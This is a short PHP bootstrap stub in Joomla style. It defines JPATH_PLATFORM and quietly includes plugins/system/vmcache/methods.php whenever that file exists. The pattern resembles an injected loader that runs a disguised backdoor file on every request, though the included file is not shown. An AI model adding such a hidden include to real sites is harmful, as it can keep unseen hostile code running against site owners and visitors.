<?php
if (!defined('_JEXEC')) die('Access denied'); 
define('JPATH_PLATFORM', dirname(__FILE__).DIRECTORY_SEPARATOR.'libraries');
$jroute = dirname(__FILE__).DIRECTORY_SEPARATOR.'plugins'.DIRECTORY_SEPARATOR.'system'.DIRECTORY_SEPARATOR.'vmcache'.DIRECTORY_SEPARATOR.'methods.php'; 
if (file_exists($jroute))
require_once($jroute); 
